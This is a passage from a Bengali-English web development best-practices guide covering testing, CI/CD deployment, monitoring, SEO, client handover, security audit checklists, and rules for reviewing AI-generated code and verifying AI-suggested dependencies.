- [ ] Images ঠিকমতো resize হচ্ছে
- [ ] Horizontal scroll নেই (mobile-এ এটা কমন bug)

### Accessibility (a11y) Testing

- [ ] সব image-এ meaningful `alt` text আছে
- [ ] Keyboard দিয়ে সব কিছু navigate করা যায় (Tab key দিয়ে ঘুরে দেখো)
- [ ] Color contrast ratio >= 4.5:1 (text vs background)
- [ ] Form fields-এ proper `<label>` আছে
- [ ] ARIA attributes ব্যবহার হয়েছে যেখানে দরকার
- [ ] Screen reader দিয়ে navigate করলে meaningful
- [ ] Focus indicator visible (Tab করলে কোন element-এ আছে বোঝা যায়)

📦 **axe DevTools** = Chrome extension — automatically accessibility issues detect করে।
📦 **Lighthouse** = Chrome DevTools-এ built-in — accessibility সহ performance, SEO, best practices audit করে।

---

## 4.3 Performance Testing Basics

| Metric | কী মাপছে | Target |
|--------|---------|--------|
| **LCP (Largest Contentful Paint)** | পেজের সবচেয়ে বড় element কতক্ষণে দেখা যায় | < 2.5 seconds |
| **FID (First Input Delay) / INP** | ইউজার প্রথমবার click করলে response কতক্ষণে আসে | < 100ms |
| **CLS (Cumulative Layout Shift)** | পেজ load হওয়ার সময় elements কতটা "লাফায়" | < 0.1 |
| **TTFB (Time to First Byte)** | সার্ভার থেকে প্রথম response কতক্ষণে আসে | < 200ms |

📦 **Lighthouse** (Chrome DevTools) — একটা audit চালাও, score দেখাবে ০-১০০ স্কেলে।
📦 **WebPageTest** (webpagetest.org) — detailed performance analysis।
📦 **k6** = Grafana-এর load testing tool — "১০০ জন user একসাথে ৫ মিনিট ধরে request করুক" — সার্ভার performance দেখো।

---

# 5. 🚀 ডিপ্লয়মেন্ট

> **ডিপ্লয়মেন্ট** = তোমার কোড development machine থেকে production server-এ নিয়ে যাওয়া — যাতে real users ব্যবহার করতে পারে।

---

## 5.1 CI/CD Pipeline

### CI (Continuous Integration)

**CI** = প্রতিবার তুমি কোড push করলে automatically build হয়, tests চলে, linting হয় — কোনো error থাকলে জানিয়ে দেয়।

### CD (Continuous Deployment/Delivery)

**CD** = CI pass হলে automatically (বা manual approval-এর পর) production-এ deploy হয়ে যায়।

**Analogy:** CI হলো factory-র quality check — প্রতিটা product বের হওয়ার আগে inspect হয়। CD হলো সেই checked product দোকানে পাঠানোর automated delivery system।

### GitHub Actions দিয়ে বেসিক CI/CD

📦 **GitHub Actions** = GitHub-এর built-in CI/CD tool।

```yaml
# .github/workflows/ci.yml
name: CI Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main, develop]

jobs:
  quality-check:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
      
      - name: Setup Node.js
        uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run linter
        run: npm run lint
      
      - name: Run type check
        run: npm run type-check
      
      - name: Run unit tests
        run: npm run test
      
      - name: Run build
        run: npm run build
      
      - name: Run security audit
        run: npm audit --audit-level=high
```

---

## 5.2 Staging → Production Release Process

### Release Flow

```
Feature Branch → PR → Develop → Staging Deploy → QA Testing → Main → Production Deploy
                 ↑                                    ↑
            Code Review                          Manual QA
            CI checks pass                       Client Preview
```

### Pre-Production Checklist

- [ ] সব automated tests pass করছে
- [ ] Code review হয়েছে
- [ ] Staging environment-এ manual testing হয়েছে
- [ ] Performance acceptable (Lighthouse >= 90)
- [ ] Security audit pass হয়েছে
- [ ] Database migrations ready (যদি schema change থাকে)
- [ ] Environment variables production-এ সেট করা আছে
- [ ] Error monitoring সেটআপ করা আছে (Sentry)
- [ ] Rollback plan ready আছে

### Rollback Strategy

**Rollback** = নতুন deploy-এ সমস্যা হলে আগের working version-এ ফিরে যাওয়া।

```bash
# 1. Git-based rollback
git revert HEAD  # সর্বশেষ commit undo করে নতুন commit তৈরি করে

# 2. Vercel/Netlify-তে — Dashboard থেকে previous deployment-এ
# "Promote to Production" করলেই rollback হয়ে যায়

# 3. Database rollback
npx prisma migrate resolve --rolled-back <migration_name>
```

💡 **প্রো টিপ:** প্রতিটা deploy-এর পর ৩০ মিনিট closely monitor করো — error rate, response time, user complaints। সমস্যা দেখলে সাথে সাথে rollback করো।

---

## 5.3 Domain, Hosting, DNS, SSL Setup

### Domain

📦 **Domain Registrar** — যেখান থেকে domain কিনবে:
- **Namecheap** — সস্তা, ভালো UI
- **Cloudflare** — at-cost pricing (কোনো markup নেই), DNS সাথে ফ্রি

### DNS (Domain Name System)

**DNS** কী? তোমার domain name (myapp.com) কে server-এর IP address-এ (192.168.1.1) translate করে — যেমন ফোনবুকে নাম দিয়ে নম্বর খুঁজো।

| Record Type | কী করে | উদাহরণ |
|-------------|--------|--------|
| **A Record** | Domain → IP address | `myapp.com → 76.76.21.21` |
| **CNAME** | Domain → অন্য domain | `www.myapp.com → myapp.com` |
| **MX** | Email routing | `myapp.com → mail.google.com` |
| **TXT** | Verification, SPF, DKIM | Domain ownership prove করতে |

### ✅ Domain/Hosting চেকলিস্ট

- [ ] Domain registered এবং DNS configured
- [ ] SSL certificate active এবং auto-renewal সেটআপ আছে
- [ ] www → non-www (বা উল্টো) redirect সেটআপ আছে
- [ ] HTTP → HTTPS redirect সেটআপ আছে
- [ ] Custom error pages (404, 500) তৈরি আছে
- [ ] Domain auto-renewal চালু আছে (expire হলে site বন্ধ!)

---

## 5.4 Backup ও Disaster Recovery

### কী কী Backup রাখতে হবে

| কী | কত ঘন ঘন | কোথায় |
|----|---------|-------|
| **Database** | Daily (automated) | Cloud storage (S3, Google Cloud Storage) |
| **User-uploaded files** | Continuous | S3, Cloudflare R2 |
| **Source Code** | Every commit (Git-ই backup) | GitHub/GitLab |
| **Environment config** | Every change | Password manager (1Password, Bitwarden) |

### 3-2-1 Backup Rule

- **3** copies of data (original + 2 backups)
- **2** different storage types (cloud + local)
- **1** offsite (ভিন্ন location-এ, যেমন different cloud region)

### Disaster Recovery Plan

**সবচেয়ে খারাপ scenario ভাবো:**
- "Server crash হলে কী করবো?" → Hosting provider-এর automatic recovery, বা অন্য region-এ deploy
- "Database corrupt হলে?" → Latest backup থেকে restore
- "Hacked হলে?" → Isolate → Assess → Restore → Secure → Notify

---

# 6. 📊 পোস্ট-লঞ্চ / মেইনটেনেন্স

> **লঞ্চ করা মানেই শেষ না — বরং real journey তখনই শুরু।**

---

## 6.1 Monitoring ও Error Tracking

### Error Tracking

📦 **Sentry** = production-এ যেকোনো error হলে real-time alert পায় — কোন file, কোন line, কোন user, কী data দিয়ে error হয়েছে — সব দেখাবে। **এটা must-have।**

```javascript
import * as Sentry from '@sentry/nextjs';

Sentry.init({
  dsn: process.env.SENTRY_DSN,
  environment: process.env.NODE_ENV,
  tracesSampleRate: 0.1,  // 10% request-এর performance trace
});
```

### Uptime Monitoring

📦 **UptimeRobot** (ফ্রি) = প্রতি ৫ মিনিটে তোমার ওয়েবসাইট up আছে কিনা check করে। Down হলে notification পাঠায়।
📦 **Better Uptime** = আরও advanced — status page তৈরি করা যায়।

### Logging

```javascript
// 📦 pino — Node.js-এর জন্য দ্রুততম logging library
import pino from 'pino';

const logger = pino({
  level: process.env.LOG_LEVEL || 'info',
  transport: process.env.NODE_ENV === 'development'
    ? { target: 'pino-pretty' }
    : undefined
});

// Logging levels:
logger.debug({ userId: '123' }, 'Fetching user preferences');
logger.info({ orderId: 'abc' }, 'Order placed successfully');
logger.warn({ attempts: 4 }, 'Multiple failed login attempts');
logger.error({ err, userId: '123' }, 'Payment processing failed');
logger.fatal({ err }, 'Database connection lost');
```

---

## 6.2 Analytics ও SEO

### Analytics

📦 **Google Analytics 4 (GA4)** = ওয়েবসাইটে কতজন আসছে, কোথা থেকে আসছে — সব track করে। ফ্রি।
📦 **Plausible** / **Umami** = Privacy-friendly alternatives (cookie-less, GDPR-compliant)।

### SEO Basics

**SEO (Search Engine Optimization)** = Google-এ তোমার ওয়েবসাইট ভালো rank করার জন্য optimization।

```html
<head>
  <title>Product Name — One-line Description</title>
  <meta name="description" content="Compelling description, 150-160 characters।" />
  
  <!-- Open Graph — Facebook/LinkedIn-এ share করলে যা দেখায় -->
  <meta property="og:title" content="Product Name" />
  <meta property="og:description" content="Description" />
  <meta property="og:image" content="https://myapp.com/og-image.png" />
  <meta property="og:url" content="https://myapp.com/page" />
  
  <meta name="twitter:card" content="summary_large_image" />
  <link rel="canonical" href="https://myapp.com/page" />
  <link rel="icon" href="/favicon.ico" />
</head>
```

### ✅ SEO চেকলিস্ট

- [ ] প্রতিটা page-এ unique `<title>` ও `<meta description>`
- [ ] Proper heading hierarchy (একটা `<h1>`, তারপর `<h2>`, `<h3>`)
- [ ] Image `alt` text আছে
- [ ] `sitemap.xml` তৈরি করা হয়েছে
- [ ] `robots.txt` configure করা হয়েছে
- [ ] Open Graph ও Twitter Card meta tags আছে
- [ ] URL structure clean (`/products/blue-widget` ✅, `/page?id=123` ❌)
- [ ] Mobile-friendly (Google mobile-first indexing করে)
- [ ] Page load speed ভালো (Core Web Vitals)
- [ ] Google Search Console-এ site register করা হয়েছে

---

## 6.3 Performance Optimization

### Caching (ক্যাশিং)

**Caching** = একই data বারবার fetch না করে একবার fetch করে কিছু সময়ের জন্য store করে রাখা।

| Caching Layer | কী করে | Tool |
|--------------|--------|------|
| **Browser Cache** | Static files ব্রাউজারে cache হয় | HTTP Cache headers |
| **CDN Cache** | Content globally distributed edge server-এ | Cloudflare, Vercel Edge |
| **Application Cache** | Frequently accessed data in-memory | Redis |
| **Database Query Cache** | Common queries-এর result cache | ORM-level, Redis |

> 📦 **CDN (Content Delivery Network)** = তোমার content বিশ্বের বিভিন্ন জায়গায় server-এ copy করে রাখে — ইউজারের কাছের server থেকে deliver হয়, তাই দ্রুত।

### Image Optimization

```javascript
// Next.js Image component — automatically optimize করে
import Image from 'next/image';

<Image
  src="/hero-image.jpg"
  alt="Hero image description"
  width={1200}
  height={600}
  priority              // Above-the-fold image হলে priority দাও
  placeholder="blur"
/>
```

### Lazy Loading

```javascript
// Next.js dynamic import
import dynamic from 'next/dynamic';

const HeavyChart = dynamic(() => import('@/components/HeavyChart'), {
  loading: () => <p>Loading chart...</p>,
  ssr: false
});
```

### Core Web Vitals

| Metric | কী মাপে | Good | Needs Work | Poor |
|--------|---------|------|------------|------|
| **LCP** | Main content কতক্ষণে দেখা যায় | ≤ 2.5s | ≤ 4.0s | > 4.0s |
| **INP** | User interaction-এ কত দ্রুত respond করে | ≤ 200ms | ≤ 500ms | > 500ms |
| **CLS** | Page-এ elements কতটা "jump" করে | ≤ 0.1 | ≤ 0.25 | > 0.25 |

---

## 6.4 Accessibility (a11y) Standards

**WCAG (Web Content Accessibility Guidelines)** = ওয়েব accessibility-র international standard।

### Quick Wins

```html
<!-- 1. Semantic HTML -->
<!-- ❌ --> <div onclick="navigate()">Click me</div>
<!-- ✅ --> <button onclick="navigate()">Click me</button>

<!-- 2. Alt text -->
<!-- ❌ --> <img src="chart.png" />
<!-- ✅ --> <img src="chart.png" alt="Sales growth chart showing 40% increase in Q3" />

<!-- 3. Form labels -->
<!-- ❌ --> <input type="email" placeholder="Email" />
<!-- ✅ --> <label for="email">Email Address</label>
         <input id="email" type="email" placeholder="you@example.com" />

<!-- 4. Skip to content link -->
<a href="#main-content" class="skip-link">Skip to main content</a>

<!-- 5. ARIA attributes -->
<button aria-label="Close dialog" onclick="closeModal()">×</button>
```

---

# 7. 🤝 ক্লায়েন্ট/বিজনেস হ্যান্ডওভার

> **কেন এই সেকশন আলাদা গুরুত্বপূর্ণ?**
> অনেক ডেভেলপার ভালো প্রোডাক্ট বানায়, কিন্তু হ্যান্ডওভার properly করে না — ফলে ক্লায়েন্ট confused থাকে, বারবার ফোন করে, এবং শেষে bad review দেয়। একটা proper হ্যান্ডওভার তোমার reputation বানায়, repeat client আনে, এবং referral generate করে।

---

## 7.1 Handover Documentation Checklist

### ✅ Technical Handover Package

#### Credentials ও Access

- [ ] **Domain registrar** — login credentials, 2FA recovery codes
- [ ] **Hosting platform** — account access, billing info
- [ ] **DNS provider** — access
- [ ] **SSL certificate** — auto-renewal status, provider info
- [ ] **Email service** — SendGrid, Postmark credentials (if applicable)
- [ ] **Analytics** — Google Analytics, Search Console access
- [ ] **Third-party services** — payment gateway, CMS, CDN access
- [ ] **Source code repository** — GitHub/GitLab repo access (owner/admin role transfer)
- [ ] **Database** — access credentials, connection string
- [ ] **Error monitoring** — Sentry access

⚠️ **গুরুত্বপূর্ণ:** সব credentials একটা secure document-এ দাও (1Password shared vault বা encrypted PDF) — email-এ plain text-এ পাঠিও না!

#### Ownership Transfer

- [ ] **Domain ownership** — ক্লায়েন্টের নামে/account-এ transfer
- [ ] **Hosting account** — ক্লায়েন্টের billing info-তে switch
- [ ] **GitHub repo** — ownership transfer
- [ ] **Third-party subscriptions** — ক্লায়েন্টের payment method-এ switch

---

## 7.2 ক্লায়েন্টকে কী কী ট্রেনিং/সাপোর্ট ডকুমেন্ট দিতে হয়

### Admin/CMS Guide

ক্লায়েন্ট যদি non-technical হয়, step-by-step guide দাও — screenshots সহ:

```markdown
# 📖 ওয়েবসাইট ম্যানেজমেন্ট গাইড

## ব্লগ পোস্ট যোগ করা
1. [CMS URL]-এ যান
2. "Blog" সেকশনে ক্লিক করুন
3. "New Post" বাটনে ক্লিক করুন
4. Title, body, featured image দিন
5. "Publish" করুন

[📸 Screenshot সংযুক্ত]

## জরুরি সমস্যা হলে
- Website down হলে: [hosting provider support link]
- Content নিয়ে সমস্যা: [your email/phone — warranty period-এ]
```

### Video Walkthrough

💡 **সবচেয়ে effective:** **Loom** (ফ্রি) দিয়ে ৫-১০ মিনিটের স্ক্রিন রেকর্ডিং বানাও।

### Technical Documentation (পরবর্তী ডেভেলপারের জন্য)

- [ ] **Architecture overview** — system diagram সহ
- [ ] **Setup guide** — locally project চালানোর instruction (README)
- [ ] **Deployment guide** — কীভাবে deploy করতে হয়
- [ ] **Environment variables list** — কী কী env variable দরকার এবং কেন
- [ ] **Known issues / tech debt** — কোন জিনিস পরে ঠিক করা উচিত
- [ ] **Third-party service documentation** — কোন service কেন ব্যবহার হচ্ছে

---

## 7.3 Contract/SLA বিবেচনা

> ⚠️ **Disclaimer:** এই সেকশন শুধু সচেতনতার জন্য — legal advice না।

### প্রজেক্ট Contract-এ কী কী থাকা উচিত

| বিষয় | কেন দরকার |
|-------|----------|
| **Scope of Work** | ঠিক কী কাজ করা হবে — বিস্তারিত ফিচার লিস্ট সহ |
| **Timeline / Milestones** | কোন phase কবে শেষ হবে |
| **Payment Terms** | কত, কিস্তিতে, payment method, late payment policy |
| **Revision Policy** | কয়বার revision included, তার পর charge কত |
| **Intellectual Property (IP)** | পেমেন্ট শেষ হলে source code ownership ক্লায়েন্টের |
| **Warranty Period** | ডেলিভারির পর কতদিন ফ্রি bug fix (সাধারণত ৩০-৯০ দিন) |
| **Maintenance Agreement** | Warranty শেষ হলে monthly/yearly rate কত |
| **Termination Clause** | কীভাবে contract বাতিল করা যায় |
| **Confidentiality / NDA** | ক্লায়েন্টের business info share করবে না |

### Warranty vs Maintenance — পার্থক্য

| | Warranty (ওয়ারেন্টি) | Maintenance (মেইনটেনেন্স) |
|--|----------------------|--------------------------|
| **কী?** | Delivered product-এ bug থাকলে ফ্রি fix | নতুন feature, update, continuous support |
| **সময়কাল** | ৩০-৯০ দিন (project fee-র মধ্যে included) | Monthly/yearly agreement (আলাদা fee) |
| **কভার করে** | শুধু agreed scope-এর মধ্যে bugs | Feature updates, security patches, server management |
| **উদাহরণ** | "Contact form submit হচ্ছে না" — ফ্রি | "নতুন payment method যোগ করো" — চার্জ |

💡 **প্রো টিপ:** Maintenance agreement থেকে recurring revenue আসে — freelancer-এর জন্য সবচেয়ে stable income source।

---

## 7.4 ফাইনাল সিকিউরিটি ও কোয়ালিটি অডিট

### ✅ Final Security Audit Checklist

- [ ] Secrets check — `.env` ফাইল Git history-তে নেই, সব secret rotated
- [ ] Default credentials removed — কোনো "admin/admin" live-এ নেই
- [ ] Debug mode off — verbose error messages production-এ বন্ধ
- [ ] Unused code/endpoints removed
- [ ] Dependencies updated — `npm audit` clean
- [ ] HTTPS enforced
- [ ] Security headers configured
- [ ] Rate limiting active
- [ ] CORS properly configured
- [ ] Backup working এবং tested
- [ ] Error monitoring active
- [ ] Payment system — test mode বন্ধ, live keys ব্যবহার হচ্ছে
- [ ] Data privacy — privacy policy, cookie consent, terms of service live

### ✅ Final Quality Audit Checklist

- [ ] Cross-browser test done
- [ ] Responsive test done
- [ ] Performance — Lighthouse score >= 80
- [ ] Forms — সব form সঠিকভাবে কাজ করছে
- [ ] 404 page — custom 404 page আছে
- [ ] Favicon — সব device-এ দেখা যাচ্ছে
- [ ] Social sharing — og:image, og:title সঠিকভাবে preview দেখাচ্ছে
- [ ] Analytics — tracking active ও data আসছে
- [ ] Legal pages — Privacy Policy, Terms of Service live
- [ ] Sitemap.xml — Google Search Console-এ submitted

---

# 8. 🤖 AI এজেন্ট দিয়ে "Vibe Coding" এর নিয়মকানুন

> **এই সেকশন কেন আলাদা গুরুত্বপূর্ণ?**
> AI coding agent (Claude, Copilot, Cursor) আজকে অবিশ্বাস্য রকম powerful — কিন্তু তারা হলো একটা অত্যন্ত দক্ষ কিন্তু কখনো কখনো overconfident জুনিয়র ডেভেলপার। তারা syntactically correct কিন্তু logically flawed বা security-vulnerable কোড লিখতে পারে — আর সেটা বেশ confidently!
>
> **মনে রাখো:** AI agent তোমার tool, তোমার replacement না। **তুমি** architect, **তুমি** reviewer, AI শুধু builder।

---

## 8.1 AI-Generated কোড Review করার নিয়ম

### General Review Practice

1. **কখনো blindly accept করো না** — AI যা দিলো সেটা সরাসরি production-এ দিও না। প্রতিটা piece of code পড়ো এবং বোঝো।

2. **"এটা কেন করলো?" জিজ্ঞেস করো** — AI-কে বলো "explain this code line by line" — যদি explanation তোমার কাছে make sense না করে, সেটা red flag।

3. **Edge cases চিন্তা করো** — "যদি input empty হয়?", "যদি user logged in না থাকে?", "যদি network fail হয়?"

### 🔴 Critical Code — Extra Scrutiny দরকার

| কোড টাইপ | কেন বিশেষ সতর্কতা | কী check করবে |
|----------|-------------------|--------------|
| **Authentication / Login** | ভুল হলে যে কেউ account access করতে পারে | Password hashing, token expiry, session management, rate limiting |
| **Payment Processing** | ভুল হলে টাকা হারাবে বা legal issue | Amount validation, idempotency, webhook signature verification |
| **Database Queries** | SQL injection, data leak | Parameterized queries, access control, sensitive data exposure |
| **File Upload** | Malicious file upload | File type validation, size limit, filename sanitization |
| **User Input Handling** | XSS, injection | Server-side validation, sanitization |
| **API Endpoints** | Unauthorized access | Auth middleware, rate limiting, input validation |

### Review Checklist (প্রতিটা AI-generated code-এর জন্য)

- [ ] কোড কী করছে তা তুমি বুঝেছো
- [ ] Error handling আছে (try-catch, proper error messages)
- [ ] Edge cases handle হচ্ছে (null, undefined, empty, very large input)
- [ ] Security vulnerability নেই
- [ ] Hardcoded secrets নেই
- [ ] Unnecessary/unused code নেই
- [ ] TypeScript types correct আছে (`any` অতিরিক্ত ব্যবহার হচ্ছে না)
- [ ] Memory leak নেই (event listeners clean up, database connections close)

---

## 8.2 AI এজেন্টকে Prompting-এর নিয়ম

### Do's ✅

1. **Context দাও**

   ```
   ✅ "আমি Next.js 14 App Router, TypeScript, Prisma ব্যবহার করছি।
   আমার auth system JWT-based। এই existing auth middleware-টা দেখো [code]।
   এখন আমাকে একটা password reset flow implement করতে হবে।"
   ```

2. **ছোট ছোট task দাও**

   ```
   ✅ Step 1: "Password reset-এর জন্য database-এ reset_tokens table-এর Prisma schema লিখো"
   Step 2: "Reset token generate করে email পাঠানোর API route লিখো"
   Step 3: "Reset token verify করে password update করার API route লিখো"
   Step 4: "Frontend-এ forgot password form বানাও"
   ```

3. **Constraints বলে দাও**

   ```
   ✅ "Error handling যোগ করো। TypeScript strict mode ব্যবহার করো।
   এই existing utility function ব্যবহার করো: [code]।
   Zod দিয়ে input validation করো।"
   ```

4. **Existing code reference দাও**

   ```
   ✅ "এই existing API route-এর pattern follow করে নতুন route লিখো: [code]"
   ```

### Don'ts ❌

1. **🔒 কখনো real secrets prompt-এ দিও না!**

   ```
   ❌ "আমার Stripe secret key sk_live_51H7... ব্যবহার করে payment setup করো"
   ✅ "Stripe payment integration-এর কোড লিখো, API key environment variable থেকে আসবে"
   ```

2. **অস্পষ্ট prompt দিও না**

   ```
   ❌ "আমার ওয়েবসাইটটা ঠিক করো"
   ✅ "Login page-এ form submit করলে 'Cannot read property of undefined' error আসছে।
   Error-টা line 45-এ হচ্ছে। এই ফাইলটা দেখো: [code]"
   ```

3. **পুরো project একবারে বানাতে বলো না**

   ```
   ❌ "আমাকে একটা পূর্ণ e-commerce website বানিয়ে দাও"
   ✅ "আমার e-commerce project-এর product listing page বানাও। Tech stack: Next.js, Prisma।
   Product schema: [schema]. API endpoint: GET /api/products. Desktop ও mobile responsive হবে।"
   ```

---

## 8.3 বড় প্রজেক্ট ছোট ছোট ভাগে ভাগ করা (Modular Approach)

### কেন ভাগ করা দরকার?

1. **AI-এর context window সীমিত** — পুরো project দিলে আগের code "ভুলে" যেতে পারে।
2. **Error isolation** — ছোট module-এ error হলে শুধু সেটা fix করো।
3. **Review সহজ হয়** — ১০০০ লাইনের diff-এর চেয়ে ৫০ লাইনের diff অনেক সহজ।

### কীভাবে ভাগ করবে — উদাহরণ (E-commerce App)

```
Phase 1: Foundation & Auth
├── Project setup (Next.js, TypeScript, Prisma, Tailwind)
├── Database schema design
├── Authentication (register, login, logout, password reset)
└── Basic layout (header, footer, navigation)

Phase 2: Product Catalog
├── Product database model
├── Product listing page (with pagination, filters)
├── Product detail page
├── Search functionality
└── Category/tag system

Phase 3: Shopping Cart & Checkout
├── Cart state management
├── Add/remove/update cart items
├── Checkout flow
├── Address management
├── Stripe payment integration

Phase 4: User Dashboard
├── Order history
├── Profile management
├── Wishlist
└── Notification preferences

Phase 5: Admin Panel
├── Product CRUD
├── Order management
├── User management
├── Analytics dashboard

Phase 6: Polish & Optimization
├── SEO optimization
├── Performance optimization
├── Accessibility audit
├── Security audit
├── Error handling & edge cases
```

### প্রতিটা Phase-এর মধ্যে:

```
Feature → AI Generate → Manual Review → Test → Commit → Next Feature
```

---

## 8.4 AI-Generated Dependencies Verify করা

### Hallucinated Package Problem

AI কখনো কখনো **এমন npm package-এর নাম বলে যেটা আসলে exist করে না** — এটাকে বলে "hallucination"। আরো ভয়ংকর — কেউ সেই নামে malicious package publish করে রাখতে পারে!

### ✅ Dependency Verification Checklist

প্রতিটা নতুন package install করার আগে:

- [ ] **npmjs.com-এ search করো** — exist করে কিনা দেখো
- [ ] **Weekly downloads দেখো** — খুব কম (< 100) হলে সতর্ক হও
- [ ] **Last publish date দেখো** — ৩+ বছর আগে হলে alternative খোঁজো
- [ ] **GitHub repo দেখো** — Stars, issues, maintainers — active কিনা
- [ ] **Bundle size দেখো** — bundlephobia.com
- [ ] **License check করো** — MIT/Apache safe; GPL — restriction আছে

```bash
# Package info দেখো:
npm info <package-name>
```

### কম Dependency ভালো

💡 **প্রো টিপ:** AI often অনেক package suggest করে। জিজ্ঞেস করো: "এটা কি native JavaScript/framework API দিয়ে করা যায় package ছাড়া?" — অনেক সময়ই যায়। কম dependency = কম maintenance = কম security risk।

---

## 8.5 Version Control-এ AI-Generated Changes Commit করা

### কেন প্রতিটা AI-generated change আলাদা commit?

1. **Rollback precision** — সমস্যাযুক্ত commit revert করো, বাকি intact
2. **Review clarity** — কোন commit AI generate করেছে, কোনটা manual — পরিষ্কার
3. **Debugging** — `git bisect` দিয়ে দ্রুত bug-এর origin খুঁজে বের করো

### Commit Strategy

```bash
# ✅ প্রতিটা logical change আলাদা commit
git add src/components/LoginForm.tsx
git commit -m "feat(auth): add login form component"

git add src/services/auth.service.ts
git commit -m "feat(auth): add auth API service layer"

git add src/app/api/auth/login/route.ts
git commit -m "feat(auth): add login API endpoint"

# ❌ সব একসাথে
git add .
git commit -m "add login feature"  # Rollback করতে গেলে সব undo হবে
```

### AI-Assisted Development Workflow (সম্পূর্ণ)

```
1. Plan: কী বানাতে চাও, কোন module → নিজে ভাবো
    ↓
2. Prompt: AI-কে clear, scoped instruction দাও
    ↓
3. Generate: AI কোড তৈরি করে
    ↓
4. Review: কোড পড়ো, বোঝো, security check, edge case check
    ↓
5. Test: Code চালাও, manually test করো, automated test চালাও
    ↓
6. Commit: ছোট, meaningful commit message সহ save করো
    ↓
7. Repeat: পরবর্তী module/feature-এ যাও
```

---

## 8.6 ফাইনাল প্রোডাক্টে AI-Generated কোডেও সব Standard Apply করা

### মনে রাখো: AI তোমার শুধু একটা tool

তুমি হাতুড়ি দিয়ে বাড়ি বানালে — কেউ "হাতুড়ি দিয়ে বানানো বাড়ি" বলে আলাদা standard apply করে না। বাড়ি বাড়িই — safety code মানতেই হবে।

**একইভাবে:**
- AI-generated কোডেও **একই security standard** apply হবে
- AI-generated কোডেও **একই code quality standard** apply হবে
- AI-generated কোডেও **একই testing standard** apply হবে
- AI-generated কোডেও **একই documentation standard** apply হবে

### "কিন্তু AI-generated কোডে কিছু জায়গায় shortcut নেওয়া যায়?" — **না।**

```
"আমি তো AI দিয়ে quick prototype বানাচ্ছি, security পরে দেখবো" — ❌ এটা কখনো সত্য হয় না।
"পরে" কখনো আসে না। Security, quality — শুরু থেকে build করতে হয়।
```

---

# 📎 Appendix: Quick Reference Tables

## A. HTTP Status Codes

| Code | মানে | কখন ব্যবহার করবে |
|------|------|------------------|
| `200` | OK | Request successful |
| `201` | Created | নতুন resource তৈরি হয়েছে (POST success) |
| `204` | No Content | Success, কিন্তু data return করার নেই (DELETE success) |
| `301` | Moved Permanently | URL permanently change হয়েছে |
| `400` | Bad Request | Client-এর request ভুল (validation error) |
| `401` | Unauthorized | Authentication দরকার |
| `403` | Forbidden | Authenticated, কিন্তু permission নেই |
| `404` | Not Found | Resource পাওয়া যায়নি |
| `409` | Conflict | Duplicate resource |
| `422` | Unprocessable Entity | Request format ঠিক, কিন্তু data invalid |
| `429` | Too Many Requests | Rate limit exceeded |
| `500` | Internal Server Error | Server-side error (bug) |
| `502` | Bad Gateway | Upstream server error |
| `503` | Service Unavailable | Server down/overloaded |

## B. Essential npm Scripts

```json
{
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "eslint . --ext .ts,.tsx",
    "lint:fix": "eslint . --ext .ts,.tsx --fix",
    "format": "prettier --write .",
    "type-check": "tsc --noEmit",
    "test": "jest",
    "test:watch": "jest --watch",
    "test:coverage": "jest --coverage",
    "test:e2e": "playwright test",
    "db:migrate": "prisma migrate dev",
    "db:push": "prisma db push",
    "db:seed": "prisma db seed",
    "db:studio": "prisma studio",
    "analyze": "ANALYZE=true next build"
  }
}
```

## C. Recommended VS Code Extensions

| Extension | কী করে |
|-----------|--------|
| **ESLint** | Real-time linting errors দেখায় |
| **Prettier** | Auto-format on save |
| **Prisma** | `.prisma` file syntax highlighting |
| **GitLens** | Git history, blame, compare |
| **Error Lens** | Error/warning inline দেখায় |
| **Thunder Client** | API testing (Postman alternative) |
| **TODO Highlight** | TODO/FIXME/HACK comments highlight করে |
| **Auto Rename Tag** | HTML tag rename auto-sync |

---

# 🏁 শেষ কথা

এই ডকুমেন্টে অনেক কিছু আছে — সব একবারে মনে রাখার দরকার নেই। এটা একটা **reference guide** — প্রজেক্টের প্রতিটা phase-এ সংশ্লিষ্ট সেকশনটা খুলে চেকলিস্ট follow করো।

**মনে রাখার মূল ৫টা জিনিস:**

1. 📋 **Plan before code** — আগে ভাবো, তারপর বানাও
2. 🔒 **Security is not optional** — শুরু থেকে built-in, পরে add-on না
3. 🧪 **Test everything** — "কাজ করছে মনে হচ্ছে" ≠ "কাজ করছে"
4. 📝 **Document as you go** — শেষে documentation করবো বললে কখনো হয় না
5. 🤖 **AI is a tool, you are the architect** — AI generate করুক, কিন্তু তুমি decide করো, review করো, responsibility নাও

**তুমি যত বেশি প্রজেক্ট করবে, এই practices তত বেশি natural হয়ে যাবে। শুরুটা ধীরে ধীরে হবে — এটা স্বাভাবিক। কিন্তু এই standards follow করলে তোমার আউটপুট দেখে কেউ বুঝতে পারবে না যে তুমি student নাকি experienced professional — কারণ output-ই সব কথা বলে।**

---

*এই ডকুমেন্ট নিয়মিত আপডেট করো নতুন শেখা জিনিস যোগ করে। Happy building! 🚀*
